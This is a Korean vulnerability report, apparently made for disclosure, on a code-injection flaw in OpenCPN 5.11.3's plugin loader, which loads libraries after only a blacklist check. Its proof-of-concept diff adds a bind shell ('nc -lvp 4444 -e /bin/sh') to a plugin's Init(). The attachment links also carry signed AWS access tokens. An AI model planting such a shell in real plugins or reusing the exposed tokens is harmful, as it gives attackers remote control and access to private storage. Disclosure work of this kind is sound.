---
notion_url: https://www.notion.so/04dbe0809830835ea2c801a5a65a41d1
last_synced: 2026-06-11 19:53
tags: [notion-sync]
---

# [KOR] OpenCPN RCE - Code Injection

취약점 제목 : OpenCPN RCE - Code Injection
취약점 요약 : 서명, 경로, 화이트리스트 검증이 없는 동적 라이브러리 링크 파일을 load 함으로써 발생하는 Remote Code Execution
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Code Injection
영향 : 프로세스 권한의 Remote Code Execution
취약한 파일명 : plugin_loader.cpp
취약한 함수명 : PluginLoader::LoadPlugIn()
취약한 파라미터 : const wxString& plugin_file, PlugInContainer* pic
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Library를 로드하는 과정 중 검증과정이 블랙리스트 기반 검증밖에 없는것을 확인

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

깃허브에서 OpenCPN용 TestPlugin 템플릿을 받아와 예시 RCE로 바인드 쉘을 사용
https://github.com/jongough/testplugin_pi.git
`src/testplugin_pi.cpp` 의 `Init()` 최상단에 다음을 추가:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

빌드 후 OpenCPN 내부에서 Plugin을 Import 하면

![image](_assets/image.png)

nc 명령으로 쉘 접속 가능함을 알수 있습니다.

취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QZR42AY7%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T105304Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJHMEUCIQCS6WA5KrJFloCNUs2ztWmY%2FrJpYdfxEvxvvdkG0FUGBwIgDPptR8Mt6pcfz44cqe1WdJCNZbkNk2e8Dzsym6mVnxoqiAQI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDMyYBXD031yTWyemZircAyhU0VUW7hPEJ3gDeVhRMuodeV0jkbTeBzoLVf1%2BXV%2BIFkjfxfp%2Fn6CCwXVwy2mQnR550446k%2BAigXWAGs80F%2Fztx%2BaeD21JRzGRn%2FCjR3lAsytttJgN9ac1xTdPXIlwngc1eSQXIO7wr%2BjdoyEUtDsRLq5kYUT8ucIy%2BfU63YF3WuW%2F6gZs4e9KI3G237f5oPJv0Fyc2X22C%2FYZiWTsn5o9nEHd2wDhedAaVZsE1wLWD9FXGqo6cFlgrvTe5TAS4uN9U35lsa6hFelyJnFk5ridJp5cF7FRowtaThWoXvH8oz1eim4I0JxEfuoVrPCWj6D40vkFuTfSGX0a98ksoF42Iui8wCqv40qDQy29LQHwnElpNPJL3BHwv8uSrG4P5qWb2B9lEXpoVvjaPUsoXID4zkEpcJDp69OU5wWFvL%2BC8zGJnOupCu9kThviyl8amm3BilcKBkdoauUiusUwGYjk6DYauLmKdssopgk50afLqH5BSlHRBylCtKQI8GcVvWZl7mggsiPAHaE5ROBM1xmavQ%2BabzbHGAo1CrwFFy0czBnO6%2BIDsXLeOMN4GDZY3HFNqqHlPiFXhmK8VO%2BxYSReL7PSwkP2qn7z5t12M9G8EWiGcD37U5fEAn1VMKz9qdEGOqUBjGKYaOfdAzTr2ns5gc%2B2fC%2B0Z45abUrnIpvd5Uo9oNHfOOwd1Aap1F2kNAsQlTEeHbds11B4bETRnfe64bj13wR992BzxTboxWT5z8KlGS4YnF5XayzQrVaS3caaxiaPQ%2BEPjvLwtplwAxRIkOTGf%2BzK8qdabx6fGbLqLZ4zxGxzOQUqNItgWUdlQ5Oe94flx8jNJ7CwNYTPIrtaTL%2BA1E0CXNv9&X-Amz-Signature=b1a84ca72fe1ec75057f4a9df585792e39b57988e8e5871ee8b1591c28f98fa0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)




> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/f9e232eb-7be1-4217-8bad-eca58c969748/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466QZR42AY7%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T105304Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJHMEUCIQCS6WA5KrJFloCNUs2ztWmY%2FrJpYdfxEvxvvdkG0FUGBwIgDPptR8Mt6pcfz44cqe1WdJCNZbkNk2e8Dzsym6mVnxoqiAQI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDMyYBXD031yTWyemZircAyhU0VUW7hPEJ3gDeVhRMuodeV0jkbTeBzoLVf1%2BXV%2BIFkjfxfp%2Fn6CCwXVwy2mQnR550446k%2BAigXWAGs80F%2Fztx%2BaeD21JRzGRn%2FCjR3lAsytttJgN9ac1xTdPXIlwngc1eSQXIO7wr%2BjdoyEUtDsRLq5kYUT8ucIy%2BfU63YF3WuW%2F6gZs4e9KI3G237f5oPJv0Fyc2X22C%2FYZiWTsn5o9nEHd2wDhedAaVZsE1wLWD9FXGqo6cFlgrvTe5TAS4uN9U35lsa6hFelyJnFk5ridJp5cF7FRowtaThWoXvH8oz1eim4I0JxEfuoVrPCWj6D40vkFuTfSGX0a98ksoF42Iui8wCqv40qDQy29LQHwnElpNPJL3BHwv8uSrG4P5qWb2B9lEXpoVvjaPUsoXID4zkEpcJDp69OU5wWFvL%2BC8zGJnOupCu9kThviyl8amm3BilcKBkdoauUiusUwGYjk6DYauLmKdssopgk50afLqH5BSlHRBylCtKQI8GcVvWZl7mggsiPAHaE5ROBM1xmavQ%2BabzbHGAo1CrwFFy0czBnO6%2BIDsXLeOMN4GDZY3HFNqqHlPiFXhmK8VO%2BxYSReL7PSwkP2qn7z5t12M9G8EWiGcD37U5fEAn1VMKz9qdEGOqUBjGKYaOfdAzTr2ns5gc%2B2fC%2B0Z45abUrnIpvd5Uo9oNHfOOwd1Aap1F2kNAsQlTEeHbds11B4bETRnfe64bj13wR992BzxTboxWT5z8KlGS4YnF5XayzQrVaS3caaxiaPQ%2BEPjvLwtplwAxRIkOTGf%2BzK8qdabx6fGbLqLZ4zxGxzOQUqNItgWUdlQ5Oe94flx8jNJ7CwNYTPIrtaTL%2BA1E0CXNv9&X-Amz-Signature=fdffc91e29357789cd704827df0342cdc9829587720366b56395ee4e65b31181&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
